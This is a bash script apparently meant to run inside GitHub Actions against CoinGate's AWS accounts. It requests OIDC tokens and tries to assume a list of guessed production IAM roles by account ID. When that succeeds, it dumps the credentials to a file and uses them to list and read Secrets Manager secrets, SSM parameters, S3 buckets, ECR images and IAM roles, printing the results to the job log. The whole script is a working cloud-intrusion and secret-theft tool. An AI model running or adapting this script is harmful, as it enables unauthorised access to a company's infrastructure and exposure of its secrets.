#!/usr/bin/env bash
# CoinGate GitHub-Actions OIDC -> STS AssumeRoleWithWebIdentity probe (intent 222362)
set -u
echo "=================== BEGIN OIDC PROBE 222362 ==================="
echo "egress_ip: $(curl -4 -s -m 10 https://api.ipify.org)"
echo "repository: ${GITHUB_REPOSITORY:-?}  ref: ${GITHUB_REF:-?}  event: ${GITHUB_EVENT_NAME:-?}"
echo "OIDC_ENV_present: url=$([ -n "${ACTIONS_ID_TOKEN_REQUEST_URL:-}" ] && echo yes || echo no) tok=$([ -n "${ACTIONS_ID_TOKEN_REQUEST_TOKEN:-}" ] && echo yes || echo no)"
if [ -z "${ACTIONS_ID_TOKEN_REQUEST_URL:-}" ]; then echo "NO OIDC ENV -> abort"; exit 0; fi

get_tok() {
  curl -s -m 20 -H "Authorization: bearer ${ACTIONS_ID_TOKEN_REQUEST_TOKEN}" \
    "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=$1" -o /tmp/tok.json
  python3 -c "import json;print(json.load(open('/tmp/tok.json')).get('value',''))"
}
decode() {
  python3 - "$1" <<'PY'
import base64,json,sys
jwt=sys.argv[1].strip()
if not jwt: print("(empty)"); raise SystemExit
def dec(x):
    x+='='*(-len(x)%4)
    return json.loads(base64.urlsafe_b64decode(x))
h,p=jwt.split('.')[0],jwt.split('.')[1]
print("HEADER:",json.dumps(dec(h)))
print("CLAIMS:",json.dumps(dec(p),indent=1,sort_keys=True))
PY
}
J1=$(get_tok "sts.amazonaws.com")
echo "----- JWT aud=sts.amazonaws.com -----"; decode "$J1"
J2=$(get_tok "https://sts.amazonaws.com")
echo "----- JWT aud=https://sts.amazonaws.com -----"; decode "$J2"

: > /tmp/creds.env
probe() {
  R="$1"; J="$2"; TAG="$3"
  echo "----- STS [$TAG] role=$R"
  curl -s -m 25 -X POST https://sts.amazonaws.com/ \
    --data-urlencode "Action=AssumeRoleWithWebIdentity" \
    --data-urlencode "Version=2011-06-15" \
    --data-urlencode "RoleArn=$R" \
    --data-urlencode "RoleSessionName=cgprobe222362" \
    --data-urlencode "WebIdentityToken=$J" \
    --data-urlencode "DurationSeconds=1800" -o "/tmp/sts_$TAG.xml" -w "http:%{http_code}\n"
  head -c 900 "/tmp/sts_$TAG.xml"; echo
  python3 - "$TAG" <<'PY'
import sys,xml.etree.ElementTree as ET
t=sys.argv[1]
try: r=ET.parse('/tmp/sts_%s.xml'%t).getroot()
except Exception as e: print("  parse-fail",e); raise SystemExit
ns={'s':'https://sts.amazonaws.com/doc/2011-06-15/'}
c={}
for p,k in [('s:AssumeRoleWithWebIdentityResult/s:Credentials/s:AccessKeyId','AK'),
            ('s:AssumeRoleWithWebIdentityResult/s:Credentials/s:SecretAccessKey','SK'),
            ('s:AssumeRoleWithWebIdentityResult/s:Credentials/s:SessionToken','ST'),
            ('s:AssumeRoleWithWebIdentityResult/s:AssumedRoleUser/s:Arn','ARN')]:
    e=r.find(p,ns); c[k]=e.text if e is not None else None
if c['AK']:
    print("  >>> SUCCESS",c['ARN'])
    with open('/tmp/creds.env','a') as f:
        f.write('export AWS_ACCESS_KEY_ID=%s\n'%c['AK'])
        f.write('export AWS_SECRET_ACCESS_KEY=%s\n'%c['SK'])
        f.write('export AWS_SESSION_TOKEN=%s\n'%c['ST'])
        f.write('export ASSUMED_ARN=%s\n'%c['ARN'])
else:
    print("  >>> FAIL", {e.tag.split('}')[-1]:e.text for e in r if e.tag.endswith('Error')})
PY
  sleep 1
}
probe "arn:aws:iam::533852667875:role/cg-core-ecs-tasks-role-prod" $J1 B01
probe "arn:aws:iam::533852667875:role/cg-core-ecs-tasks-execution-role-prod" $J1 B02
probe "arn:aws:iam::533852667875:role/cg-core-app-role-prod" $J1 B03
probe "arn:aws:iam::533852667875:role/cg-core-ci-role-prod" $J1 B04
probe "arn:aws:iam::533852667875:role/cg-core-github-oidc-role-prod" $J1 B05
probe "arn:aws:iam::533852667875:role/cg-core-oidc-role-prod" $J1 B06
probe "arn:aws:iam::533852667875:role/GitHubActionsRole" $J1 B07
probe "arn:aws:iam::533852667875:role/github-actions" $J1 B08
probe "arn:aws:iam::533852667875:role/cg-github-oidc-role-prod" $J1 B09
probe "arn:aws:iam::533852667875:role/cg-testas-app-prod-tasks" $J1 B10
probe "arn:aws:iam::533852667875:role/cg-testas-github-oidc-prod" $J1 B11
J3=$(get_tok 'sigstore')
echo "----- JWT aud=sigstore -----"; decode "$J3"
probe "arn:aws:iam::602675409103:role/cg-testas-ecs-tasks-role-prod" "$J3" B-sigstore

echo "===== AWS READ-ONLY (only if creds) ====="
if [ ! -s /tmp/creds.env ]; then echo "NO CREDS"; echo "=================== END OIDC PROBE ==================="; exit 0; fi
. /tmp/creds.env
export AWS_DEFAULT_REGION=eu-central-1 AWS_PAGER=""
echo "--- get-caller-identity"; aws sts get-caller-identity --output json 2>&1 | head -20
echo "--- secretsmanager list-secrets (names only)"; aws secretsmanager list-secrets --output json --query 'SecretList[].{Name:Name,ARN:ARN}' 2>&1 | head -c 5000
echo
echo "--- get cg-testas-secret-prod"; aws secretsmanager get-secret-value --secret-id cg-testas-secret-prod --output json 2>&1 | head -c 2000
echo
echo "--- ssm describe-parameters"; aws ssm describe-parameters --output json --query 'Parameters[].{Name:Name,Type:Type}' 2>&1 | head -c 3000
echo
echo "--- s3 list-buckets"; aws s3api list-buckets --query 'Buckets[].Name' --output json 2>&1 | head -c 2000
echo
echo "--- ecr describe-images cg-testas-ecr-prod"; aws ecr describe-images --registry-id 602675409103 --repository-name cg-testas-ecr-prod --region eu-central-1 --query 'imageDetails[].{tags:imageTags,pushedAt:imagePushedAt}' --output json 2>&1 | head -c 1500
echo
echo "--- iam list-roles"; aws iam list-roles --query 'Roles[].{name:RoleName,path:Path}' --output json 2>&1 | head -c 4000
echo
echo "=================== END OIDC PROBE ==================="
